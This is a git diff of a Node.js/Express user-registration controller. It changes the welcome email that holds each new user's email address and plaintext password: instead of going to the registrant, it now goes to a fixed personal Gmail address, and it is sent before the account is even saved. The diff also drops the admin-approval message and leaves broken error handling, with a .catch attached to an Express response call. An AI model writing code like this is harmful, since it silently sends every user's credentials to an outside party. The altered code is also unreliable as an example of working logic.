@@ -30,8 +30,7 @@ exports.createUser = (req, res, next) => {
 
 
      bcrypt.hash(password,10).then(hash=>{
-   
-
+  
        const user = new User({
           usr_nom: req.body.nom,
           usr_prenom: req.body.prenom,
@@ -45,33 +44,36 @@ exports.createUser = (req, res, next) => {
           privilege_id:1,
           societe_id:1,
         });
-             user.save()
+
+        const options ={
+          from:"bsn-dz@alrim.dz",
+          to:"chelliahlem98@gmail.com",
+          subject:"Compte user ",
+          text:"wit's support technique \n voter nom d'utilisateur : "+req.body.email +"\n voter password : " +password, 
+        };
+        transporter.sendMail(options, function(err,info){
+          if(err){
+            console.log(err);
+            return;
+          }
+          console.log("Sent:  "+info.response);
+        });
+    
+
+        user.save()
           .then(result => {
-            const options ={
-              from:"bsn-dz@alrim.dz",
-              to:req.body.email,
-              subject:"Compte user ",
-              text:"wit's support technique \n voter nom d'utilisateur : "+req.body.email +"\n voter password : " + password, 
-            };
-            transporter.sendMail(options, function(err,info){
-              if(err){
-                console.log(err);
-                return;
-              }
-              console.log("Sent:  "+info.response);
-            });
         
           });   
            res.status(201).json({
-            message: 'Account created successfully ! \n Please wait for the admin\'s approval.',
+            message: 'Account created successfully !.',
            
-          });
-     })
-        .catch(err => {
+          }).catch(err => {
           res.status(500).json({
             error: err,
             message: 'Username or Email already in use !',
           });
         });
+     })
+        
     
   };
